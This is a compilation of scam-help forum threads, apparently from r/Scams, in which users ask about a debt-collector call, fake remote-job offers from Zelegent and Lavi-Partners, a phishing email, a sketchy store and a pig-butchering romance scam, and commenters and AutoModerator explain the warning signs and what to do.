- it isnt really ‚ÄúCrypto‚Äù its tokenized equity on blockchain. This is a legit investment trend happening - his idea is not new. Bc the US and major corporations buy into what are called ESG iniatives as part of their ‚Äúdoing their part‚Äù to show shareholders and investors they are social aware. So this would be selling parts of reforrestation initiatives to corporations. This is part of their UNs intiative ‚Äî Net Zero targets for corporations are set by the UN, which is why they would be involved.

No he wasn‚Äôt trying to fundraise via crypto but he was trying to fundraise without solid proof this was backed by the UN and all these legit bankers are involved. Like those bankers are not going to tie their name to project that is money laundering. I assume they don‚Äôt know he is saying all this shit or the project is merely a pipedream and they are telling him they will Be involved if he can get it off the ground.But this is for sure, you don‚Äôt go to investors and tell them you have closed a $100M funding round when you haven‚Äôt, which is what he was telling me to do with my contacts. I was like yeah see ya.
- >tokenized equity on blockchain

Tied to what productive good or service? Backed by what credit?

The financial markets are full of "legit investments" that are scammy as hell.
- it is legit happening - it is backed by land equity

Title: Got a call from a mediation attorney stating I could settle a debt today or settle in court.
Body: Update: first and foremost, a serious thank you to everyone here for responding so quickly and without just telling me I‚Äôm stupid. 

I called and spoke to them again (against some advice here and I understand why they said cut contact) but I had already stated I would speak to other avenues of payment so I asked if a check was acceptable. They said no. Again, the woman was very polite and sweet on the phone. Almost sympathetic. I simply advised I would have no further contact with them and hung up.

Again, thank you to everyone here for responding so quickly. I know these updates probably seem dumb but for people googling things, it‚Äôs nice to see someone going through what they are and the process. 

Original:

Hi everyone. I‚Äôm not new when it comes to debt collector calls or anything, but I recently received a call from someone who stated they were a compliance officer saying they would be out between 3-5 pm and listed a very old address.

The first couple messages that were left for me had the last two digits of the callback number cut off, but today they actually repeated the number twice so I was able to call back.

I then spoke with someone who said they were a mediation attorney and said there was a debt (that does exist and I had lost track of completely, so that is my fault) in my name and the reason why it was now out of collections was that there are a certain amount of delinquency dates before the debt goes back to the original bank that the money was deposited into. Now the bank was trying to directly collect. 

She offered to discord over to the bank and see if I could settle for a much less amount or usually they would offer monthly payment plans. This took about two minutes. She never asked for any other information or current address which was a little odd to me if they were so intent on serving papers from the previous messages I had received.

I told her I would need to make a couple phone calls to see what would be feasible for me and she said she could put the account on a 24-hr stay so they didn‚Äôt send another courier out. 

Like I said, the debt is real and I would like to pay it, but the amount they are asking for, even if it is much less than the original debt just isn‚Äôt something I can pay. I‚Äôm also aware that tax season is a big time for stuff like this. 

Please forgive me if some of this is disjointed. Something just isn‚Äôt sitting right with me about this. Any feedback is appreciated. Thank you in advance for reading. 

Update to add: the debt is from 2019. So I believe march would make this 6 years old.

- Even though you have an outstanding debt, this sounds like a very common scam. Since it's an old debt, there should not be any rush, no "24 hour stay." Do your due diligence to find out the real status of the debt, and contact the person or entity you owe to arrange a payment schedule. But the phone call is almost certainly unrelated and from a scammer.
- Learn about zombie debts. It sounds like this might apply.
- Sounds like a scam: https://www.reddit.com/r/Scams/comments/1i7fqd8/possible_phone_scam_from_law_office/

How old is the debt? Look up the statute of limitations for your state - most states only allow debts to be collected up to six or seven years. If the debt is older than that, then you may be dealing with a "zombie" collector, that is - someone who bought a noncollectable debt for pennies on the dollar and is now going to try and harass you into paying. 

If the debt is in fact too old to collect, then tell them that you won't acknowledge the debt and that they are no longer permitted to contact you. They will make all sorts of threats (mostly bogus) but the reality is that they have no legal recourse. You can then block all their numbers and ignore them.
- If this was a real creditor, they'd have a way to find your true address and send you debt collection paperwork in anticipation of service for court process. Don't speak to these people any more.



If you want to proactively clear up this debt, check your credit report, if applicable, which will tell you who reported the delinquency. Or reach out to the original company and ask them what credit agency bought your debt.¬†


Scam calls like this work because it's relatable enough when someone hears the message (oh, I have a debt), just like the 'your package is delayed' scam texts, because we're often getting packages delivered.


Even if they had just enough information to make you think it's real, it's probably personal info they found in an unscrupulous manner.
- Is the debt more than seven years old?
- !debt
- In addition to all the great advice you've gotten here so far, if you speak with them one other thing you could try to do is ask *if* you were to go about paying it would they take a check?  If they're a scammer, the answer to this will probably almost certainly be no.  They might try to say it has to transfer today because of whatever warrant or whatever bullshit they are trying to peddle here ... so you *must* Venmo / Zelle / PayPal someone *today*.  At which point, you can be 100% sure it's a scam.  A legit debt collector would have no issues with a "the check is in the mail" wait for a couple days - especially since it re-establishes your ownership of the debt and *could* reset the statute of limitations clock.  So even a small check, a legit debt collector would have in interest in receiving.

But ... don't actually send a check to anyone.  Just wait to hear the inevitable Paypal / Venmo / Zelle scam, that's when you know it's fake.
- Fair Debt Collection Practices Act.  Read it.

The debt collector has to prove they own the debt and it is legally collectible, ie not past the statute of limitations.

Or you just just contact the party you owe the debt to and arrange payment.
- How old is this debt? Are you familiar with the statute of limitations for debts? I bet this is outside the SOL. Also, per the Fair Debt Collection Practices Acr they owe you a letter about this debt. When they call Bach (don‚Äôt waste your time calling them), remind them of this. Would be worthwhile to read up on the FDCPA.
- Well, I feel like an idiot now. I just looked up my state which says 5 years for all debts so this is probably definitely a zombie collector. For some reason I thought it was only medical debt that stopped being collectible after a certain time. 

Thank you for your response.
- Thank you so much. I‚Äôm usually pretty good at spotting these, but I guess the fact they had so much info was a little unsettling. I‚Äôll definitely see about contacting the original company.
- I should have included that. It‚Äôs from 2019 so this year it will be 6 years old I believe in March.
- Hi /u/Ok-Lingonberry-8261, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Report correctly referenced documents (SSN, drivers license, credit card) as stolen to the respective agencies. If you are unsure of how to move forward, request guidance from local law enforcement. Credit to user l0john51 for this script.

- One easy way to tell for sure - tell them to send you a debt validation letter in writing to your address. Emails and texts don't count - it has to be a physical letter. A legitimate collector will happily do that, but a scammer or zombie collector will try and find some way to weasel out of it. Don't allow them to gaslight you - they may claim that it's too late, or the letter will be filed with the court documents in a suit, but that's all BS. By law, they have to send the letter no matter what - no excuses.

If you do actually get the letter, which is unlikely, make sure that the date of default is accurate and that it is within the statute of limitations for your state. Call the creditor to confirm if you have to.
- There‚Äôs a zombie debt collection wave going on. The trick is to ignore them. Stop all communication.
- Someone probably already said it, but when they send you literature to prove the debt is valid, it HAS to say whether the statute of limitations has passed or not yet, even if it's in tiny print. Do you still owe the debt? Sure, however they have to state that by blowing them off it won't affect your credit. Also, a lot of debt collectors will start collecting with more enthusiasm as it gets closer to that limit.
- We are fortunate these scammers are just bad enough to raise our red flags. They get any better, we are screwed...
- They bought the zombie debt so they get a lot of information, but some of it will turn out to be outdated.
- Check with an attorney in your state. It may not be collectible at all if that old *unless* you agree to make some payment or make a partial payment. It was probably written off long ago

Don't give them a current address
- Will do. Thank you for the advice!

Title: Anyone heard of Zelegent?
Body: My wife got a job offer for remote work from this company today. They had seen her resume on a job site that she had just posted it to and reached out via email. She had to do some online skills assessment and send them a little info, but they haven't actually  spoken to her directly, which made me suspicious.

Even though their website (Zelegentinc.com) looks official, it doesn't have any contact information other than an email. There are some news articles about this company, but they are years old. Their few social media accounts haven't been used in years and reference an older website (Zelegent.com), which seems to be gone.

They said they will be sending her a laptop to use and a check with which she has to buy a software license.They said she needs to buy the license herself because of Know Your Customer laws. At this point I am thinking it is a scam to get her to pay for something, and then they yank the funds. 

Anyone else see this one before?

- Scam. Just tell your wife that 99% of all remote jobs are scams these days. That will save her a lot of time.
- It's a !fakecheck scam.
- > They said they will be sending her a laptop to use and a check with which she has to buy a software license.They said she needs to buy the license herself because of Know Your Customer laws. 

Scam --- this is it right here, the scam buried in all the other verbiage. Usually they claim that they will send you a check to buy equipment and software from a vendor (which is really the scammers). But scammers must be reading explanations about how that works, so they have a new version. **Real companies set up the hardware and software, with the company's software licenses, and ship everything to you.**

The "check" you deposit will be fake. You will pay your real money to the scammers for a "software license", then your bank will reverse out the deposit when they discover it's fake, and you will lose your money.

Most job offers for remote or work from home jobs are scams. There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages". But what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, Telegram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (check is fake, you lose money)

- job involves re-shipping packages (parcel mule)
- You are wise to be suspicious and to come here with your suspicions. 

We see many job-related scams on this site, and most of them fall within the fake-check scam (check the auto-mod postings that others have placed in this thread) and the !task scam. The first one tells the victim that they are sending them a check, one that is fake, and then tells them to use the funds in one way or another after it has "cleared". Most victims don't realize that a check clearance is essentially a two-stage process. There is the initial clearance, sometimes called "provisional credit", that takes one to a few business days, and it is after this, the funds become available to use -- but only provisionally. The second stage involves actual verification of the funds from the issuer's bank. This can take anywhere from a few days to a few weeks, and here is where the funds that were initially provisionally released can get clawed back.

Note that scammers often ask the victim which bank they use. This is to avoid sending a check that appears to come from the same bank, because when this happens, the check bounces much more quickly and often before the victim can spend the money.

So, it is the time period between these two stages where the scammers ask the victim to spend funds, ostensibly for job-related things, but really to allow the victim to send money, real money, their **own** money, back to the scammers. Fun, no?
- Literally was about to deal with that check from them JUST NOW before I felt funny about the whole thing from the get go, and lo and behold 41 minutes ago this was posted and popped up in google. They are roping in a lot of people today!
- Let‚Äôs see if I‚Äôve got this syntax correct: 

!whois zelegentinc.com

!whois zelegent.com 

And it‚Äôs a !job scam, they‚Äôre really common.
- Literally going through the same thing the past couple days same company. It wasn't until I got the offer letter today with no official interview past the online assessment asking me to set up a telegram account until my employee profile was official and saying they'd send me a check for licensing due to KYC and AML that I got confirmation of my suspicion it is a scam.
- >she needs to buy the license herself because of Know Your Customer laws

The customer is the company, not the employee. And KYC only applies to financial institute's direct customer.
- You are 100% correct.  This is a fake job scam.  Most likely they will send her a fake check to deposit.
- Hi guys, wanted to update on some things i found out. Not only have I done some of the same, i reported them to FTC & BBB. I also found a list of " Bio Pharmaceutical companies " That went under, merged, collapsed, sold or went out of business and DING DING, guess which company is on the list the original company either merged or sold in 2021! This website was also created off of a website called "namecheap.com" a website developing company to create websites and pay less money. I'm sure that this is all local information but i am so outraged that people decide to do this and prey on the innocent and people desperate for work, so please to anybody reading this be careful and vigilent. ESPECIALLY remote work opportunities. We all want them and that's one of the biggest reasons for these scams. I wish everyone luck!
- I just got a job offer from them and was just about to sign the offer letter. I'm so glad I didn't. I knew it seemed too good to be true.
- Website was created two days ago (2025-01-20) which is a sure sign of a scam. The standard recommendations in a case such as this are to cease all contact, block the senders on all platforms, and delete any messages which have been received from the scammers.

- This is a scam. I almost got scammed by "Sarah McCoy". Luckily, my husband saw all of these comments before I gave her my personal info.¬†
PLEASE DO NOT FALL FOR THIS SCAM.
- Hello Everyone! Coming from someone who was curious and suspicious about the very same thing, this thread has now confirmed that this job offer was indeed a scam. I was not in contact with anyone from HR via phone call, it was all done through e-mail. I was texted from a 949 area code # with updates regarding the position and after taking the assessment and employment info link i received an offer letter via e-mail as well. This offer letter sketched me out from reading it with the whole " the company will issue you a check for licensing software to be used to comply with KYC laws ". Although, if you google this, this may be true the fact that the company sending you the laptop and hardware should already have this installed on the computer systems. I have done some digging and found a few of the same red flags.. ( website no longer exists ) a newer website that has the name. All I can say is, I am an experienced employee in the financial field for a long time- I am aware of plenty of these types of scams. Please do not deposit or accept any checks from any company looking to employ you. I truly wish all the people looking for work out there the best of luck! we are all in the same boat!
- Wow I literally got the same exact offer from this company just hours ago.  Thanks for the info
- Based on these similar reports, I just reported to the SSA and submitted the information for this company as a scam.
- Yes. I was suspicious and have been checking out their stuff since they contacted me a few days ago. None of their numbers work and I think the old medical info that pops up...well, at least they're trying to lay the groundwork better on these scams. I'm so sad. I really need decent work.
- They got me today. When I researched them this morning I didn‚Äôt see this thread. Glad I caught this before dealing with them tomorrow.
- "Sarah" asked me, via the text from the 949 number, to send an email to their HR department with my resume. When I emailed them, "Sarah" was the one who replied to my email. 

I knew this shit was too good to be true.
- BTW. Please report to the BBB. I went looking for it there first.
- BTW, we reported them to the FTC as well
- [removed]
- They're going to send a laptop?
- They just took up my time with the assessment and I drove to staples this morning to print and sign the paper so I could fax it back. I figure after that they would ask me to deposit the fake check so I could purchase the "license". Its so weird tho cause I look up the elevo sleeping device and it says that they and another company developed it. Hope that other people come here before depositing that check.

- Hi /u/DasLazyPanda, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/SecureWriting8589, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/AceyAceyAcey, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

Title: Ordered something from Doughnutbagscanada.com, did I just get scammed and what should I do about my credit card?
Body: Did I get scammed and should I be worried about my credit card?

I ordered a bag on a site called doughnutbagscanada website while sleep deprived but even taking one second to look at the site it looks sketchy as hell. Should I call my bank about it tomorrow since I input my credit card? I don‚Äôt usually buy things online but my impulse got the best of me and ordered something cute üò≠ there was a doughnutofficial website but it kept asking if I wanted to go to the Canada website so I looked up doughnut bags canada and I ended up there (in the sketchy site). The order I put in said it was gonna cost me 85 CAD but I looked at my bank app and it said the pending amount was around 95 CAD. Like I should definitely call my bank tomorrow morning right? What do I tell them? Should I close this credit card and get a new one ((this is also my FIRST credit card)) or am I just gonna have to live with the purchase of some bag I might not even get because it didn‚Äôt even give me a receipt just a transaction historyüò≠üò≠ any advice or info would be good since my mother or family isn‚Äôt much help to me

also yes it was really stupid of me to put in my card info in some site that looks sketchy but I didn‚Äôt think about it at the time and this is honestly just what I get for going online shopping at 3am 

I locked my card just in case something happens when I go to sleep but I don‚Äôt know what I should do after that..

Title: Getting scammed by Amazon third party seller
Body: Returned an item to a seller and took many pictures of the item. Sent message to seller and attached pictures via amazon messaging showing item in perfect shape.

Seller gets the item, doesn't contact me for a week, i had to contact the seller to check for my refund. He then sends me pictures of "an" item that is similar to the one I sent back with scratches and dents. The item I sent was double boxed with Styrofoam etc. so I know he got it in great condition.

He is trying to claim that I returned the item "abused" (bad english too). No matter how many pictures i send him proving that the item i sent was flawless, he keeps the lie and doesn't want to refund me.

I contacted amazon and they had me send a message with pictures (which I did 3 times with great details). I have still to hear back (not sure who looks at these messages). I called and explained to 2 agents who were supposed to write notes on the account. I call back yesterday and lo and behold the agent says I see there is a pending claim with A to Z warranty but what happened. At the point i was pissed and asked him to escalate to a manager. The manager was understanding and I even told him to go read the messages that the seller was sending me refusing to refund me and sticking to the "abused" product". Manager tells me that the claim is still open to give me 7 days and A to Z will refund me. He said we have A to Z warranty to deal with situation like this. I told him how the seller is most likely taking another similar product that is scratched and sending me these pics.

I know the seller got the item intact, he just wants to make these claims and then resell the one that i sent and hope he doesn't have to refund me (over $1000).

The agents even tell me how the seller has really bad reviews etc. but yet they don't write the notes so i have to repeat myself every time i call. So far the Manager told me that after 7 days the warranty company would refund me but in the meantime, the seller keeps saying no; even asked me why i bought the product to then return it; well I can return it if I don't like it.

Additional detail: Even when I spoke to the seller on the phone initially (before returning the product to him), he was reluctant to refund me as he kept saying "oh now that the product is opened and used , it's second hand and I don't think that I can refund you the whole amount (he told me that on the phone). I googled his company name and saw even more reviews calling him a scammer. I should have looked into it more before buying from him.

Now lets hope Amazon can refund me since I am making this a very big deal with them and i know then when they contact the seller, he will stick with his lies.

- As frustrating as it is dealing with a scammer like this, I think you can rely on Amazon in this case to refund you as claimed. Just wait out the 7 days. You've done your part and documented it all well.
- Please expose the seller name in such instances so that the public is aware about such scammers
- I have so many pictures that i took, the box that I sent the item back etc etc. I sent a lot of the same pictures that I sent to the seller to Amazon claims. i wish there was an Amazon fraud department to deal with them

Title: Trying to understand what this phishing email does
Body: I got this email as I was just waiting for someone to also send me a document to sign as horrible timing and me not thinking clearly. When i click on review document I get taken to the page below and when I click on "I confirm" i just get taken right to my google account without logging in. 

I also then tried it in a private browser to see what that link does and it takes me to the offical google log in page.

So I'm curious what they're trying to do here I reviewed all my logs and no new apps or 3rd parties have been added

- It might have looked like Google, but it could be a phishing site that you put your credentials in (thinking it's actually Google) and then they have your password and username, sometimes they incorporate a 2-factor workaround where it says a code is sent to you, it's actually a "forgot my password" reset code and if you enter the code, your account becomes theirs and they use your account to scam other people (or search your email to find other things they can do, like if you online bank they can try password resets with your email account).

I say that because you say it took you to your Google account login, thing is a 3rd party website does not have control over whether you're signed into Google (on a Google site or product) or not, only Google does, so that would be characteristic that it was a phishing site of Google that you were redirected to.

Edit: just went to it (don't try this at home, we're what you call, "professionals"), yep it's phishing, says it's a Gmail sign in, it is not a Google site, they are harvesting your credentials if you put it in.

Edit2: A little more testing, it can detect if you're using developer tools (using Javascript of course) and if it detects, it will redirect to the real Google, it's a way to evade detection.
- "just waiting for someone to also send me a document"

If you are doing any kind of business deal such as buying a home or car , taking out a loan, or anything else that uses these documents, create an email address to be used for that project (homeless2025atmydomain.com). 

Unless there is a data leak or your data is sold by whoever has that email address, it should remain spam free...but still be careful!
- It's designed to look official and simultaneously get around spam filters.
- It redirected to a russian domain pretending to be google. If you clicked on that, it likely asks you to enter your credentials to harvest it.
- Interesting but curious because when I clicked on it I got taken to my Google account without entering anything, could they still have taken the creds?
- That‚Äôs a great idea for this doing that from now on for sure
- But I never had to enter any information as I was as already logged into Google
- No. It probably detects various factors and to trick people in general it can simply redirect to Google and it won‚Äôt cause any issue with Google. Only if you put in credentials on the phishing site is the issue, redirects don‚Äôt do anything to your account.
- It seems like the possible flow was:

* You were already signed into Google?
* Phishing link when clicked on took you unquestionably into the legit Google you were already signed into?

I would be concerned about the possibility that your session token has now been grabbed up
- Yup unquestionably I got taken to the legit Google site so them using this to get session tokens can make sense

Title: Work from home scam? Lavi-Partners?
Body: Wondering if any one has heard of the lavi partners. I have worked many work from home gigs and currently work one but was looking for part time to full some extra hours. 

I got an offer from the lavi-partners. Medical data entry stuff and yes my resume supports the job description but it seems off.  Their interview process is odd to say the least but not unheard of but I never spoke to any one in person on cam just text chat. 

 Have not sent any personal info yet but they are asking for I9 and my id which is standard but what if they are a scam then they have my ssn and dl ugh. Its odd that they asked for just my dl instead of my social though for an i9 generally you need both or a passport as well as your dl.  Any thoughts or any one who can translate  page from Israel for me? lol I think they are posing as the company and the company is real but i only speak English and google translate only does so much. 

Update yes they are a total scam send you a check via FedEx ex etc. they come off as very legit but after much research I called them a scammer to their digital face and they have yet to respond.

- Remote data entry jobs are fake 99% of the time.  If the interview process was entirely through chat I would round that up to 100%.
- Text chat only interviews are a major red flag.  The company very well may exist but you aren't talking to them it's someone who has spoofed their site or info.

it's a fake !job scam and might also be a !fakecheck scam
- I actually got an offer as well and I am on the fence about whether it is a scam. They sent me an offer letter, code of business conduct, W-4 form, I-9 form and direct deposit form. I looked up the website and they have a linked in profile but the HR person I have been in communication with has been pretty through, very professional and no red flags aside from the message communication through Microsoft teams. All of my paperwork has been in English.
- I got a text from them a day ago and they sent me another one today. I don't remember applying to any of their positions online either. So I am just going to assume that it's not a real job. I'm definitely sceptical about these job texts. I personally don't know if they are a legit company either.
- I got an email today from Lavi wanting to set up a interview on teams. I have applied in Indeed but I'm not sure if this was one of the positions. My background also fits their needs but my first thought was to Google them so maybe that's my instincts kicking in.

- Also their email is hr.lavi-partners.us.  That seemed strange too. I think lavi partners may be a real company but I doubt these peeps are from them.
- Yeah I checked Google and everything I could search to see if I could find anything on scams and this post was the first thing I found today.

Title: Investment scam in gold
Body: Hi, I just started dating again after getting out of a long-term relationship, so it's been a couple of decades and my skills of meeting women are rusty to say the least. Anyway, I got a text from someone and it was an obvious wrong number. I was polite about it and she said she was interested in me. I texted back and forth for a while but she insisted we move to WhatsApp. First red flag, right?
On WhatsApp, she started to seduce me with kind words and tell me how she was lonely. She told me that she trades in gold options during special trading nodes. She asked me if I wanted to go in on the trades. I told her that I didn't have money to invest. She continued to message with me. Last week, she told me that she did a trade and made $40k on an investment of $100k. I asked her what she was going to do with the money. She said that she was going to buy a Rolls Royce. She sent me pictures the next day. Yesterday, she showed me that she made $60k off a $150k investment. I told her that I was interested in doing the next trade.
All of the sudden, she switched into greedy mode. She insisted that I set up Cash App and send her my username immediately. It was late night and I said that I would do it tomorrow. She reiterated her request. That's when the scam alarm signaled in my head. I did a simple chat with ChatGPT asking if this was a scam and it said ‚ÄúYES!‚Äù along with a bunch of advice. I blocked her on WhatsApp. I want to report her, but I wonder if it will do any good or if it's just a waste of time and I should be grateful for escaping her trap without losing any money. Your advice please üôè

- You can be proud of yourself for listening when the alarm bells - finally - went off, most people don't to their regret. 

But you really need to be more careful if you continue online dating, because you missed the first couple of huge red flags. There are a quite a few dating scams around and you need to be aware of them. Stick around on this sub and learn so you don't become a victim.
- Stranger + money talk = scam

People on the internet = strangers no matter how long you've chatted
- ‚ÄúI got a text from someone‚Äù, that‚Äôs as far as you need to go.  You don‚Äôt need to find the ‚Äúfirst red flag‚Äù on moving to WhatsApp (you already have two red banners before when getting a wrong text, and second when the person kept talking to you after a wrong number- mate, if you text a wrong number all you say is you are sorry and move on, you don‚Äôt keep chatting with the guy you wrong texted). 

Your Scam alarm as you call it is kind of broken mate.  It should have been triggered a month before that, on the first conversation. 

I do have to admit I‚Äôm baffled after all this time to hear guys still continue this kind of conversations and for a second still believe they are real on anyway possible.  But some people believe the stripper is REALLY INTO THEM  so, yeah, happens
- You were getting !pigbutchered


Good job on bailing
- > I did a simple chat with ChatGPT asking if this was a scam and it said ‚ÄúYES!‚Äù 

I am not looking forward to the next phase of humanity.
- Dude, I get that you have been out of the dating world a while, but things haven't changed so much that simply talking to someone of the opposite sex means you talk financial investments after a day and send each other money via the Cash App.  Come on.

Furthermore, Rolls Royces cost a heck of a lot more than the alleged $40k she made on a trade, so the idea that she made $40k one day and had a Rolls in her driveway the next is ridiculous.

Of course this is a scam.  I don't see how anyone couldn't spot it instantly, even if you had no background information.

And as far as reporting it, who do you think you should report to?  In fact, what do you think this person has specifically done wrong to you?  They asked you to invest money and you said you would but then came to your senses.  Where is their crime?  What exactly would you report?

Block and move on. The world is a harsh place and it sounds like you managed to avoid a pitfall a lot of other people fall into.  Consider yourself lucky.
- It's a waste of time to report. May not even be a woman, probably some dude on the other side of the world.

Yes 100% scam and glad you noticed before you sent them any money. Any earning or profit they would show is just fake.
- Trying to meet someone online is hell these days. So many scammers. You need to educate yourself. The wrong number is actually the first step of many scams.

Real women who are interested in getting to know you will not send you nude photos before meeting you. They won't ask for nude photos. Real women who are actually interested in meeting a guy will not start talking about money or investing before getting deep into an in-person relationship. 

Read through this sub. There are many sad stories here on r/scams of people who have lost money to scams that begin with meeting someone online. They pretend to be interested in you for a few weeks, even longer, and then they move on to the next stage of the scam: stealing your money with sextortion blackmail, or stealing your money with fake investments.
- Glad you didnt lose any money.
Any person who you met that tells you about investing are scams.
Stop wasting your time. She will just change a number and name for the next victim.
Just block her and move on with your life.
- What other advice do you need? Block, delete, and move on. That's it.
- !wrongnumber
- [removed]
- Pig butchering scam! block "her". You are not dating the girl you see on the picture. They are operating from boilers rooms somewhere in Asia.
- That's why I signed up for this sub. I'm about to search it for "Plenty of Fish" so I can learn those scams.
- I'm trying to meet new people. That's why I didn't mind chatting.
- You would be amazed how little blood goes to a dude's brain when it is going to another part of their body.  For some reason, some guys just think there is a massive pool of hot women out there just begging to send them nudes and then do more in real life.
- [deleted]
- Well, that's a new term to me. I just looked it up and you are correct. Do you agree with a previous poster that it's a waste of time to report it?
- I blocked her. Lesson learned. No money lost.
- Their crime, in my estimation, is that if she's doing this to me, she's doing it to others and succeeding. Perhaps some law enforcement is out there who can prosecute her and recover money from other victims - if they have the information?
- No nudes, or even talk of nudes, were exchanged. I don't have money to begin with because my ex got it last year. I kept telling her that and said it would be months or even years before I could invest. It's when she demanded that I set up Cash App that I was like, "hey, wait a minute!" Anyway, I just want to know if reporting it does any good?
- This is so correct!
- Wow! That's a lot to digest. Thanks for the information üòä
- Hi /u/onlymodestdreams, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.

- Hi /u/Rotas_dw, AutoModerator has been summoned to explain the Pig butchering scam.

